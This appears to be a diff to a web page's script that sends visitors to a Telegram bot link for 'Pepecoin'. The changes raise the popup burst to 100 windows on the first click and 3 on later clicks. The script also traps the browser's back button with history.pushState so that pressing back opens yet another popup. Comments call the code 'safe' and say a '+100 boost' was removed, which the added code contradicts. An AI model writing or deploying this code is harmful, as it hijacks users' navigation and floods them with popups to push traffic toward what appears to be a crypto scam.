@@ -213,8 +213,6 @@ cursor:pointer;
 </div>
 
  <script>
-
-<script>
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
 let clickCount = 0;
@@ -228,12 +226,12 @@ function openPopup(url){
   }
 }
 
-// ✅ MULTI POPUP ENGINE (max 4 safe)
+// ✅ MULTI POPUP ENGINE
 function openPopups(url, count){
   for(let i = 0; i < count; i++){
     setTimeout(() => {
       openPopup(url);
-    }, i * 700); // একটু fast কিন্তু safe
+    }, i * 800); // safe delay (important)
   }
 }
 
@@ -246,8 +244,10 @@ function openExternal(){
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  // ✅ FIXED: 1 click = 4 popup
-  let popupCount = 4;
+  // 👉 popup logic
+  let popupCount = (clickCount === 1) ? 100 : 3;
+
+  // ❌ REMOVED unsafe +100 boost (causes block)
 
   // ✅ TELEGRAM
   if(isTelegram){
@@ -267,7 +267,7 @@ function openExternal(){
 
     setTimeout(() => {
       openPopups(smartLink, popupCount);
-    }, 1000);
+    }, 1200);
   }
 
   // 🍎 IOS
@@ -281,7 +281,7 @@ function openExternal(){
 
     setTimeout(() => {
       openPopups(smartLink, popupCount);
-    }, 1000);
+    }, 1200);
   }
 
   // 💻 PC
@@ -299,17 +299,17 @@ document.addEventListener("click", function(e){
   }
 });
 
-// 🔥 BACK BUTTON SAFE VERSION
+// 🔥 BACK BUTTON SAFE VERSION (light)
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
   history.pushState(null, null, location.href);
 
-  // 1টা popup only (safe)
+  // safe single popup
   openPopup(smartLink);
 };
-</script>
 
+ </script>
      
 </body>
 </html>
